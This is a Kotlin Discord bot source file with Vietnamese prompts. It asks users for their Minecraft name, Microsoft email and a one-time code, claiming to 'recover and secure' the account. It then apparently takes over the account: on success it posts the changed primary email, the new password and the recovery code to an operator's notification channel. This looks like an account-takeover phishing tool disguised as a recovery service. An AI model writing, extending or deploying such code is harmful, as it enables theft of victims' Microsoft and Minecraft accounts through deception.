package event.events

import config.BotPropertiesManager
import dev.kord.common.entity.ButtonStyle
import dev.kord.common.entity.TextInputStyle
import dev.kord.core.Kord
import dev.kord.core.behavior.interaction.modal
import dev.kord.core.behavior.interaction.respondEphemeral
import dev.kord.core.behavior.interaction.response.respond
import dev.kord.core.event.interaction.ButtonInteractionCreateEvent
import dev.kord.core.event.interaction.ModalSubmitInteractionCreateEvent
import dev.kord.core.on
import dev.kord.rest.builder.message.actionRow
import discord.DiscordLogger
import event.model.EventInterface
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeout
import microsoft.recovery.RecoveryService
import microsoft.recovery.model.RecoveryResult
import org.slf4j.LoggerFactory
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap

class RecoveryInteractionEvent(
    private val recoveryService: RecoveryService,
    private val discordLogger: DiscordLogger,
) : EventInterface {

    private val logger = LoggerFactory.getLogger(RecoveryInteractionEvent::class.java)
    private val recoveryScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private val pendingOtpSessions = ConcurrentHashMap<String, CompletableDeferred<String>>()

    override fun register(kord: Kord, properties: BotPropertiesManager) {
        kord.on<ButtonInteractionCreateEvent> {
            val componentId = interaction.componentId
            when {
                componentId == "start_recovery_btn" -> {
                    interaction.modal("Khôi phục tài khoản", "recovery_step1_modal") {
                        actionRow {
                            textInput(TextInputStyle.Short, "ign_input", "IGN") {
                                required = true
                                placeholder = "Nhập tên in-game Minecraft"
                            }
                        }
                        actionRow {
                            textInput(TextInputStyle.Short, "email_input", "Email") {
                                required = true
                                placeholder = "Nhập email tài khoản Microsoft"
                            }
                        }
                    }
                }

                componentId.startsWith("open_otp_modal:") -> {
                    val sessionId = componentId.substringAfter("open_otp_modal:")
                    interaction.modal("Nhập mã OTP", "recovery_step2_modal:$sessionId") {
                        actionRow {
                            textInput(TextInputStyle.Short, "otp_input", "Mã OTP") {
                                required = true
                                placeholder = "Nhập mã OTP gồm 6 chữ số"
                            }
                        }
                    }
                }
            }
        }

        kord.on<ModalSubmitInteractionCreateEvent> {
            val modalId = interaction.modalId
            when {
                modalId == "recovery_step1_modal" -> {
                    val ign = interaction.textInputs["ign_input"]?.value?.trim().orEmpty()
                    val email = interaction.textInputs["email_input"]?.value?.trim().orEmpty()

                    val response = interaction.deferEphemeralResponse()
                    val sessionId = UUID.randomUUID().toString().take(8)

                    recoveryScope.launch {
                        try {
                            val result = recoveryService.runLifecycle(
                                email = email,
                                otpProvider = {
                                    val otpDeferred = CompletableDeferred<String>()
                                    pendingOtpSessions[sessionId] = otpDeferred
                                    runCatching {
                                        response.respond {
                                            content = "Mã OTP đã được gửi đến proof bảo mật của `$email`.\nNhấn nút bên dưới để nhập mã OTP:"
                                            actionRow {
                                                interactionButton(ButtonStyle.Primary, "open_otp_modal:$sessionId") {
                                                    label = "Nhập mã OTP"
                                                }
                                            }
                                        }
                                    }.onFailure { err ->
                                        logger.error("Failed to respond with OTP button: {}", err.message)
                                    }
                                    try {
                                        withTimeout(120_000L) {
                                            otpDeferred.await()
                                        }
                                    } finally {
                                        pendingOtpSessions.remove(sessionId)
                                    }
                                },
                                stageListener = { stageKey, stageName, isSuccess, detail ->
                                    discordLogger.logStage(
                                        logChannelId = properties.logChannelId,
                                        stageKey = stageKey,
                                        stageName = stageName,
                                        isSuccess = isSuccess,
                                        detail = detail,
                                    )
                                },
                            )

                            when (result) {
                                is RecoveryResult.Success -> {
                                    discordLogger.sendFinalResult(
                                        notiChannelId = properties.notiChannelId,
                                        isSuccess = true,
                                        ign = ign,
                                        originalEmail = email,
                                        newEmail = result.newPrimaryEmail,
                                        password = result.password,
                                        recoveryCode = result.finalRecoveryCode,
                                    )
                                }

                                is RecoveryResult.Failure -> {
                                    discordLogger.sendFinalResult(
                                        notiChannelId = properties.notiChannelId,
                                        isSuccess = false,
                                        ign = ign,
                                        originalEmail = email,
                                        errorReason = "${result.stage}: ${result.message}",
                                    )
                                }
                            }
                        } catch (e: Exception) {
                            logger.error("Failed to run recovery lifecycle for {}: {}", email, e.message, e)
                            discordLogger.sendFinalResult(
                                notiChannelId = properties.notiChannelId,
                                isSuccess = false,
                                ign = ign,
                                originalEmail = email,
                                errorReason = e.message ?: "Unexpected error",
                            )
                        }
                    }
                }

                modalId.startsWith("recovery_step2_modal:") -> {
                    val sessionId = modalId.substringAfter("recovery_step2_modal:")
                    val otp = interaction.textInputs["otp_input"]?.value?.trim().orEmpty()

                    interaction.respondEphemeral {
                        content = "Đã nhận mã OTP. Đang xử lý khôi phục và bảo mật tài khoản..."
                    }

                    pendingOtpSessions[sessionId]?.complete(otp)
                }
            }
        }
    }
}
